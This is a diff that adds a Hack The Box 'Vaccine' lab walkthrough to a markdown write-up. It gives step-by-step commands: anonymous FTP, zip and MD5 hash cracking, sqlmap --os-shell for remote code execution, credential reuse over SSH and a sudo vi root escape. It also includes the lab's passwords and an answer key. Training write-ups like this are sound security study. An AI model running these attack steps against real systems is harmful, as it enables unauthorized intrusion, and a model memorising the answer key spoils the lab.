@@ -6,14 +6,14 @@
 |---------|------|----------|----------------|----------|
 | **Archetype** | 2 | SMB (445), MSSQL (1433), WinRM (5985) | 2026-04-04 | [↓ Jump to Archetype](#htb-starting-point-archetype) |
 | **Oopsie** | 2 | HTTP (80), SSH (22) | — | — |
-| **Vaccine** | 2 | FTP (21), HTTP (80), SSH (22) | — | — |
+| **Vaccine** | 2 | FTP (21), HTTP (80), SSH (22) | 2026-10-27 | [↓ Jump to Vaccine](#htb-starting-point-vaccine) |
 | **Unified** | 2 | HTTP (8080/8443), SSH (22) | — | — |
 
 ---
 
-> **Tier 2 Progress:** 1/4 machines completed (25%)  
+> **Tier 2 Progress:** 2/4 machines completed (50%)  
 > **Next:** Oopsie  
-> **Last Updated:** April 4, 2026
+> **Last Updated:** October 27, 2026
 
 ---
 
@@ -359,6 +359,445 @@ HTB{REDACTED}
 **Machine Completed** ✅
 
 *Last Updated: April 4, 2026*
+
+</div>
+
+---
+
+# HTB Starting Point: Vaccine
+
+## Anonymous FTP → Zip Crack → MD5 Crack → SQL Injection (RCE) → SSH → sudo vi Privilege Escalation
+
+| System Detail | Information |
+|---------------|-------------|
+| Machine Name | Vaccine |
+| Difficulty | Starting Point (Tier 2) |
+| Target IP | 10.129.95.174 |
+| Completion Date | October 27, 2026 |
+
+## 📋 Table of Contents
+
+- [Reconnaissance](#-phase-1-reconnaissance-vaccine)
+- [FTP Enumeration](#-phase-2-ftp-enumeration)
+- [Cracking the Zip Archive](#-phase-3-cracking-the-zip-archive)
+- [Cracking the Admin Hash](#-phase-4-cracking-the-admin-hash)
+- [SQL Injection → RCE](#-phase-5-sql-injection--rce)
+- [SSH Foothold & User Flag](#-phase-6-ssh-foothold--user-flag)
+- [Privilege Escalation](#-phase-7-privilege-escalation-sudo-vi)
+- [Attack Path Summary](#-attack-path-summary-vaccine)
+- [Questions & Answers](#-questions--answers-vaccine)
+- [Quick Reference](#-quick-reference-vaccine)
+- [Troubleshooting](#-troubleshooting-vaccine)
+- [Lessons Learned](#-lessons-learned-vaccine)
+
+## 💻 Environment Setup
+
+| Component | Specification |
+|-----------|---------------|
+| Attack Machine | Kali Linux (2024.x) |
+| Connectivity | OpenVPN (HTB Lab Configuration) |
+| Tools Used | Nmap, ftp, zip2john, John the Ripper, hashcat, sqlmap, ssh |
+
+> **Note:** Ensure your HTB VPN is active and you can `ping` the target IP before beginning enumeration.
+
+---
+
+### 🔍 Phase 1: Reconnaissance (Vaccine)
+
+#### Initial Port Scan
+
+Discovery reveals three services: **FTP (21)**, **SSH (22)**, and **HTTP (80)**.
+
+```bash
+# Service versioning + default scripts
+nmap -sC -sV -p 21,22,80 10.129.95.174
+```
+
+**Output (trimmed):**
+```text
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+22/tcp open  ssh     OpenSSH 8.0p1 Ubuntu 6ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+| http-csrf:
+|   Found the following possible CSRF vulnerabilities:
+|     Form id: login__username
+```
+
+**Interpretation:**
+
+| Service | Version | Key Info |
+|---------|---------|----------|
+| FTP | vsFTPd 3.0.3 | Check for anonymous login |
+| SSH | OpenSSH 8.0p1 (Ubuntu) | Likely post-exploitation foothold |
+| HTTP | Apache 2.4.41 (Ubuntu) | "MegaCorp Login" page with a login form |
+
+---
+
+### 📂 Phase 2: FTP Enumeration
+
+The nmap CSRF script hinted at a login page, but FTP is the quicker win — vsftpd often allows anonymous access on these boxes.
+
+```bash
+# Connect anonymously (username: anonymous, blank password)
+ftp 10.129.95.174
+```
+
+**Login:**
+```text
+Name (10.129.95.174:kali): anonymous
+331 Please specify the password.
+Password: (press Enter)
+230 Login successful.
+```
+
+> **[!IMPORTANT]**
+> Watch the spelling — `annonymous` fails, `anonymous` succeeds. A typo here looks like "login incorrect" and sends people chasing the wrong rabbit hole.
+
+#### List and Download
+
+```bash
+ftp> ls -la
+# -rwxr-xr-x    1 0        0            2533 Apr 13  2021 backup.zip
+
+# Ensure binary mode so the archive isn't corrupted
+ftp> binary
+ftp> get backup.zip
+ftp> exit
+```
+
+> **[!TIP]**
+> If `get` returns `No control connection for command`, the session's data channel dropped — reconnect and retry. Always confirm `binary` mode before pulling an archive.
+
+---
+
+### 🔐 Phase 3: Cracking the Zip Archive
+
+The downloaded `backup.zip` is password-protected. Extract its hash and crack it offline.
+
+```bash
+# Extract the zip hash
+zip2john backup.zip > zip_hash
+
+# Crack with rockyou
+john --wordlist=/usr/share/wordlists/rockyou.txt zip_hash
+
+# Show the cracked result
+john --show zip_hash
+```
+
+**Cracked zip password:**
+```text
+741852963
+```
+
+**Extract the contents:**
+```bash
+unzip -P 741852963 backup.zip
+# inflating: index.php
+# inflating: style.css
+```
+
+---
+
+### 🔓 Phase 4: Cracking the Admin Hash
+
+Reading the backed-up login page reveals a hard-coded admin credential check.
+
+```bash
+cat index.php
+```
+
+**Key snippet:**
+```php
+if($_POST['username'] === 'admin' &&
+   md5($_POST['password']) === "2cb42f8734ea607eefed3b70af13bbd3") {
+     $_SESSION['login'] = "true";
+     header("Location: dashboard.php");
+}
+```
+
+Crack the MD5 hash (via hashcat, John, or CrackStation):
+
+```bash
+# hashcat: mode 0 = raw MD5
+echo '2cb42f8734ea607eefed3b70af13bbd3' > admin.hash
+hashcat -m 0 admin.hash /usr/share/wordlists/rockyou.txt
+```
+
+**Cracked password:**
+```text
+qwerty789
+```
+
+**Login credentials for the web app:**
+
+| Field | Value |
+|-------|-------|
+| Username | `admin` |
+| Password | `qwerty789` |
+
+Log in at `http://10.129.95.174/` with `admin:qwerty789`. You land on `dashboard.php`, which has a **search** box — grab the `PHPSESSID` cookie from your browser's dev tools for the next phase.
+
+---
+
+### 🗄️ Phase 5: SQL Injection → RCE
+
+The `search` parameter on `dashboard.php` is injectable, but only once sqlmap carries a **valid authenticated session cookie** (without it, every request is 302-redirected to the login page and nothing appears injectable).
+
+```bash
+sqlmap -u "http://10.129.95.174/dashboard.php?search=test" \
+  --cookie="PHPSESSID=<your_real_session_cookie>" \
+  --batch --os-shell
+```
+
+> **[!WARNING]**
+> Passing a placeholder like `PHPSESSID=YOUR_COOKIE_HERE` makes sqlmap report "parameter does not appear to be injectable." That is a **false negative** caused by the login redirect — not proof the box is patched. Paste the actual cookie value from a logged-in session.
+
+**Result — injection confirmed:**
+```text
+Parameter: search (GET)
+    Type: stacked queries
+    Title: PostgreSQL > 8.1 stacked queries (comment)
+    Payload: search=test';SELECT PG_SLEEP(5)--
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 5 columns
+
+back-end DBMS: PostgreSQL
+```
+
+sqlmap uses PostgreSQL's `COPY ... FROM PROGRAM` to drop into an OS shell:
+
+```text
+os-shell> whoami
+command standard output: 'postgres'
+```
+
+> **[!TIP]**
+> The `--os-shell` prompt is finicky with blind/time-based output. When it stalls, answer the "retrieve the command standard output?" prompt, keep commands simple, and prefer pulling what you need (like a config file) in a single command rather than an interactive back-and-forth.
+
+---
+
+### 👤 Phase 6: SSH Foothold & User Flag
+
+The web app's database connection string lives in `dashboard.php` on the target. Read it through the os-shell to recover the PostgreSQL / SSH password:
+
+```bash
+os-shell> cat /var/www/html/dashboard.php
+```
+
+**Recovered credential (from the `pg_connect` string):**
+```text
+password = P@s5w0rd!
+```
+
+Since the `postgres` system user reuses this password, SSH in directly — far more stable than the sqlmap shell:
+
+```bash
+ssh postgres@10.129.95.174
+# password: P@s5w0rd!
+```
+
+**Capture the user flag:**
+```bash
+postgres@vaccine:~$ cat user.txt
+HTB{REDACTED}
+```
+
+---
+
+### 👑 Phase 7: Privilege Escalation (sudo vi)
+
+Check what `postgres` is allowed to run as root:
+
+```bash
+sudo -l
+```
+
+**Result:**
+```text
+User postgres may run the following commands on vaccine:
+    (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf
+```
+
+`postgres` can run `vi` as root against that config file. Per [GTFOBins](https://gtfobins.github.io/gtfobins/vi/), `vi` can spawn a shell from within its command mode — and since it runs as root, so does the shell.
+
+```bash
+# Open the allowed file as root
+sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
+```
+
+Then, inside `vi`, type:
+```text
+:!/bin/sh
+```
+
+This drops to a **root shell**:
+
+```bash
+# whoami
+root
+
+# cat /root/root.txt
+HTB{REDACTED}
+```
+
+> **[!NOTE]**
+> A one-shot `sudo vi -c ':!/bin/sh'` does **not** work here — sudoers only permits the exact command `/bin/vi /etc/postgresql/11/main/pg_hba.conf`. You must open that specific file, then escape to a shell from inside the editor.
+
+---
+
+### 📊 Attack Path Summary (Vaccine)
+
+```text
+┌─────────────────────────────────────────────────────────────────────────┐
+│ 1. Anonymous FTP login                                                  │
+│    └─► Downloaded backup.zip                                           │
+└─────────────────────────────────────────────────────────────────────────┘
+                                    │
+                                    ▼
+┌─────────────────────────────────────────────────────────────────────────┐
+│ 2. zip2john + John                                                      │
+│    └─► Zip password: 741852963 → index.php                             │
+└─────────────────────────────────────────────────────────────────────────┘
+                                    │
+                                    ▼
+┌─────────────────────────────────────────────────────────────────────────┐
+│ 3. Cracked admin MD5 hash                                               │
+│    └─► admin:qwerty789 → dashboard.php                                 │
+└─────────────────────────────────────────────────────────────────────────┘
+                                    │
+                                    ▼
+┌─────────────────────────────────────────────────────────────────────────┐
+│ 4. sqlmap on search param (authenticated cookie)                        │
+│    └─► PostgreSQL injection → --os-shell (RCE as postgres)             │
+└─────────────────────────────────────────────────────────────────────────┘
+                                    │
+                                    ▼
+┌─────────────────────────────────────────────────────────────────────────┐
+│ 5. Read dashboard.php → found P@s5w0rd!                                 │
+│    └─► SSH as postgres → user.txt                                      │
+└─────────────────────────────────────────────────────────────────────────┘
+                                    │
+                                    ▼
+┌─────────────────────────────────────────────────────────────────────────┐
+│ 6. sudo -l → /bin/vi on pg_hba.conf as root                             │
+│    └─► :!/bin/sh → root shell → root.txt                               │
+└─────────────────────────────────────────────────────────────────────────┘
+```
+
+---
+
+### 📝 Questions & Answers (Vaccine)
+
+| # | Question | Answer |
+|---|----------|--------|
+| 1 | What is the name of the file downloaded over FTP? | `backup.zip` |
+| 2 | What script comes with John the Ripper to extract a zip hash? | `zip2john` |
+| 3 | What is the password for the `backup.zip` file? | `741852963` |
+| 4 | What is the admin password after cracking the MD5 hash? | `qwerty789` |
+| 5 | What is the parameter vulnerable to SQL injection? | `search` |
+| 6 | What type of database is running? | PostgreSQL |
+| 7 | What is the password found for the `postgres` user? | `P@s5w0rd!` |
+| 8 | Which binary is used for privilege escalation? | `vi` (via `sudo`) |
+
+---
+
+### ⚡ Quick Reference (Vaccine)
+
+```bash
+# 1. Anonymous FTP
+ftp 10.129.95.174      # user: anonymous / blank password
+ftp> binary
+ftp> get backup.zip
+
+# 2. Crack the zip
+zip2john backup.zip > zip_hash
+john --wordlist=/usr/share/wordlists/rockyou.txt zip_hash
+unzip -P 741852963 backup.zip
+
+# 3. Crack the admin MD5
+echo '2cb42f8734ea607eefed3b70af13bbd3' > admin.hash
+hashcat -m 0 admin.hash /usr/share/wordlists/rockyou.txt   # => qwerty789
+
+# 4. SQLi to RCE (use a REAL session cookie)
+sqlmap -u "http://10.129.95.174/dashboard.php?search=test" \
+  --cookie="PHPSESSID=<real_cookie>" --batch --os-shell
+
+# 5. SSH foothold
+ssh postgres@10.129.95.174           # password: P@s5w0rd!
+
+# 6. Privesc (GTFOBins vi)
+sudo -l
+sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
+# inside vi:  :!/bin/sh
+```
+
+---
+
+### 🐛 Troubleshooting (Vaccine)
+
+| Issue | Solution |
+|-------|----------|
+| FTP `Login incorrect` | Spelling: use `anonymous` (not `annonymous`), blank password |
+| FTP `No control connection for command` | Reconnect; set `binary` mode before `get` |
+| `unzip: cannot find or open local_backup.zip` | Match the actual filename (`backup.zip`, not a renamed copy) |
+| `apt` lock / permission errors installing tools | `zip`/`unzip` ship with Kali; `which unzip` — no reinstall needed |
+| sqlmap: "parameter not injectable" | You used a placeholder cookie — paste a **real** authenticated `PHPSESSID` |
+| sqlmap `302 redirect to index.php` | Session expired/invalid; log in again and grab a fresh cookie |
+| `--os-shell` returns "No output" | Answer the output-retrieval prompt; keep commands simple; read files in one shot |
+| `sudo vi -c ':!/bin/sh'` denied | sudoers allows only the exact `pg_hba.conf` command — open the file, then escape |
+
+---
+
+## 💡 Lessons Learned (Vaccine)
+
+| # | Lesson |
+|---|--------|
+| 1 | **Anonymous FTP first** — vsFTPd with anonymous access is a classic starting-point foothold; always try it before heavier web enumeration. |
+| 2 | **Offline hash cracking** — `zip2john` + John (and `hashcat -m 0` for raw MD5) turn a password-protected backup and a hard-coded hash into working credentials. |
+| 3 | **Weak hashing = instant creds** — Unsalted MD5 (`2cb42f...` → `qwerty789`) is trivially reversible; never store passwords this way. |
+| 4 | **Authenticated SQLi needs a session** — sqlmap must carry a valid `PHPSESSID`, or the login redirect masks the injection as a false negative. |
+| 5 | **PostgreSQL RCE** — `COPY ... FROM PROGRAM` (sqlmap `--os-shell`) gives command execution as the DB user on PostgreSQL. |
+| 6 | **Config files leak credentials** — `dashboard.php` held the DB password, reused for the `postgres` system user — pivot to a stable SSH shell. |
+| 7 | **GTFOBins + sudo** — A single `sudo` entry for an editor like `vi` is a full root escape via `:!/bin/sh`. Audit sudoers entries carefully. |
+| 8 | **Exact sudo commands matter** — Sudoers matched the full argument list, so only opening that specific file worked — not an inline `-c` one-liner. |
+
+---
+
+## 🔗 Resources
+
+- [vsFTPd Documentation](https://security.appspot.com/vsftpd.html) — FTP server used by the target
+- [John the Ripper](https://www.openwall.com/john/) — `zip2john` and offline password cracking
+- [hashcat](https://hashcat.net/hashcat/) — GPU password recovery (MD5 mode `-m 0`)
+- [sqlmap](https://sqlmap.org/) — Automated SQL injection and `--os-shell`
+- [GTFOBins: vi](https://gtfobins.github.io/gtfobins/vi/) — sudo privilege escalation reference
+- [PostgreSQL COPY](https://www.postgresql.org/docs/current/sql-copy.html) — `FROM PROGRAM` command execution
+
+---
+
+## 🏷️ Tags
+
+`#htb` `#vaccine` `#ftp` `#anonymous-login` `#zip2john` `#john` `#hashcat` `#md5` `#sqlmap` `#sql-injection` `#postgresql` `#rce` `#ssh` `#gtfobins` `#sudo-vi` `#privilege-escalation`
+
+---
+
+## 🏁 Flags Captured
+
+| Flag | Location | Value |
+| :--- | :--- | :--- |
+| **User Flag** | `/var/lib/postgresql/user.txt` | `HTB{REDACTED}` |
+| **Root Flag** | `/root/root.txt` | `HTB{REDACTED}` |
+
+---
+
+<div align="center">
+  
+**Machine Completed** ✅
+
+*Last Updated: October 27, 2026*
 
 </div>
 
